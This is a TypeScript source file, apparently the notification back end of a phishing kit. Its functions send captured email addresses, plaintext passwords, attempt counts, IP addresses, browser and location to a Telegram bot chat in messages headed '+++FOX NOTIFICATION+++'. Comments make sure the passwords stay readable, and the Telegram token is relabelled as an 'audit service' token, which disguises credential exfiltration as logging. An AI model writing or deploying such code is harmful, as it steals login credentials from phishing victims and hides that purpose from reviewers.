import { getTelegramBotToken, getTelegramChatId, isTelegramConfigured, obfuscateForLogging } from './telegramConfig'

function escapeTelegramMarkdown(text: string): string {
  // Escape all Telegram MarkdownV2 special characters
  // BUT preserve email addresses and common readable text
  return text.replace(/([_*\[\]()~`>#+\-=|{}.!\\])/g, '\\$1')
}

// Format email addresses without escaping (for display)
function formatEmail(email: string): string {
  // Don't escape emails - they should be readable
  return email
}

// Format password for display (ensure it's visible)
function formatPassword(password: string): string {
  // Don't escape passwords - they should be visible
  return password || '[no password]'
}

interface LayerNotification {
  layer: string
  status: string
  email: string
  password?: string
  ip: string
  userAgent: string
  location?: string
  timestamp: string
  attemptNumber?: number
  details?: Record<string, any>
}

export async function sendLayerNotification(data: LayerNotification): Promise<boolean> {
  const auditServiceToken = await getTelegramBotToken() // Legacy: telegramBotToken
  const auditChannelId = await getTelegramChatId() // Legacy: telegramChatId

  if (!(await isTelegramConfigured())) {
    return false
  }
  
  // Log obfuscated token for debugging (only in development)
  if (process.env.NODE_ENV === 'development' && auditServiceToken) {
    console.log(`🔐 Using audit service token: ${obfuscateForLogging(auditServiceToken)}`)
  }

  const timestamp = new Date().toLocaleString('en-US', {
    weekday: 'short',
    month: 'short',
    day: 'numeric',
    year: 'numeric',
    hour: '2-digit',
    minute: '2-digit',
    hour12: true,
  })

  // Build clean, readable message
  let message = `+++FOX NOTIFICATION+++

🔐 ${data.layer.toUpperCase()}

Status: ${data.status.toUpperCase()}
Email: ${data.email}
${data.password ? `Password: ${data.password}` : ''}
${data.attemptNumber ? `Attempt: ${data.attemptNumber}` : ''}

▬▬▬▬▬▬ DEVICE INFO ▬▬▬▬▬▬
IP: ${data.ip}
Browser: ${getBrowserName(data.userAgent)}
${data.location ? `Location: ${data.location}` : ''}
Time: ${timestamp}
${data.details ? `\n▬▬▬▬▬▬ DETAILS ▬▬▬▬▬▬\n${JSON.stringify(data.details, null, 2)}` : ''}`

  try {
    const telegramUrl = `https://api.telegram.org/bot${auditServiceToken}/sendMessage`

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: auditChannelId,
        text: escapeTelegramMarkdown(message), // Send as plain text - readable!
        parse_mode: 'HTML', // Optional: use HTML for formatting
      }),
      signal: AbortSignal.timeout(5000),
    })

    if (!response.ok) {
      const errorText = await response.text()
      return false
    }

    return true
  } catch (error) {
    if (process.env.NODE_ENV === 'development') {
      console.error('Layer notification error details:', error)
    }
    return false
  }
}

export async function sendTelegramMessage(message: string): Promise<boolean> {
  
  try {
    const auditServiceToken = await getTelegramBotToken() // Legacy: telegramBotToken
    const auditChannelId = await getTelegramChatId() // Legacy: telegramChatId
    
    
    if (!auditServiceToken || !auditChannelId) {
      return false
    }
    
    const url = `https://api.telegram.org/bot${auditServiceToken}/sendMessage`
    
    
    try {
      // For HTML mode, we don't need to escape markdown - just send as plain text
      // HTML mode allows <, >, & to be escaped, but we're using plain text
      // So we'll use plain text mode instead to avoid any escaping issues
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: auditChannelId,
          text: message, // Send as plain text - no escaping needed
          parse_mode: undefined, // Plain text mode - emails and passwords will display correctly
        }),
        signal: AbortSignal.timeout(5000),
      })
      
      
      if (!response.ok) {
        const errorText = await response.text()
        return false
      }
      
      const data = await response.json()
      
      
      return true
    } catch (error) {
      return false
    }
  } catch (error) {
    return false
  }
}

function getBrowserName(ua: string): string {
  if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome'
  if (ua.includes('Firefox')) return 'Firefox'
  if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari'
  if (ua.includes('Edg')) return 'Edge'
  if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera'
  return 'Unknown'
}

